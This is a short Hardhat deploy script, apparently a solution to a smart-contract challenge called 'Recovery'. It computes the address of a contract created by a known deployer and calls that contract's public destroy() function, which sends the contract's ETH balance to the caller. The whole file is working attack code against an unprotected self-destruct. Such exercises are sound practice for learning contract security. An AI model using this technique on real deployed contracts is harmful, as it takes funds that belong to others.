import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
import { Recovery__factory, SimpleToken__factory } from '../../typechain-types';

const func:DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const recoveryAddress = "0xe096eC01C4a3FD0db47463F2Cfd51bC17eb07495"

    // console.log(">>>>Attach Recovery contruct");
    // const Recovery = await ethers.getContractFactory("Recovery",(await ethers.getSigners())[0])as Recovery__factory;
    // const recovery = Recovery.attach(recoveryAddress)
    const SimpleToken = await ethers.getContractFactory("SimpleToken",(await ethers.getSigners())[0]) as SimpleToken__factory;

    const simpleTokenAdd = await ethers.utils.keccak256(ethers.utils.solidityPack(["bytes1","bytes1","address","bytes1"],["0xd6","0x94",recoveryAddress,"0x01"]))
    const simpleTokenAddress = "0x"+simpleTokenAdd.substring(simpleTokenAdd.length-40,simpleTokenAdd.length)
    console.log(simpleTokenAddress);
    const simpleToken = SimpleToken.attach(simpleTokenAddress)
    console.log("eth balance",await ethers.provider.getBalance(simpleTokenAddress));
    const destroyReasult = await simpleToken.destroy((await ethers.getSigners())[0].address)
    await destroyReasult.wait()
    console.log("eth balance",await ethers.provider.getBalance(simpleTokenAddress));

}
export default func;
func.tags = ['Recovery'];